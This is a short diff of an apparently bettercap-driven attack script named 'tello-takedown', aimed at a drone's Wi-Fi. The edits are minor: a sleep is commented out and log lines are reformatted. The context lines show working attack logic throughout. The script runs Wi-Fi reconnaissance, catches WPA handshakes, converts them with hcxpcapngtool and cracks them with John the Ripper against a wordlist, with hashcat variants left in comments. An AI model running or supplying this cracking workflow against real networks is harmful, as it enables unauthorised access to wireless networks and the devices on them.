@@ -7,7 +7,7 @@ log('📝 Script tello-takedown started');
 
 log('📝 Turning on wifi recon');
 run('wifi.recon on');
-run('!sleep 2')
+//run('!sleep 2')
 
 /*log('📝 Setting up ticker');
 run('set wifi.show.sort clients desc');
@@ -93,7 +93,7 @@ onEvent('wifi.client.handshake', function(event){
         //cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' ' + handshakesFileName;
         log('🪄 Converting packets to JtR wpapsk format');
         cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName + ' &> /dev/null'; //TODO: Add &> /dev/null?
-        log('Command: ' + cmd);
+        log('   Command: ' + cmd);
         run('!'+cmd);
 
         //log('Sleeping...');
@@ -103,7 +103,7 @@ onEvent('wifi.client.handshake', function(event){
         //cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 22000 -a 0' +
         //    ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName + ' ' +  wordlistFileName;
         cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName + ' &> /dev/null';
-        log('Command: ' + cmd);
+        log('   Command: ' + cmd);
         run('!'+cmd);
 
         //TODO: Monitor output file?
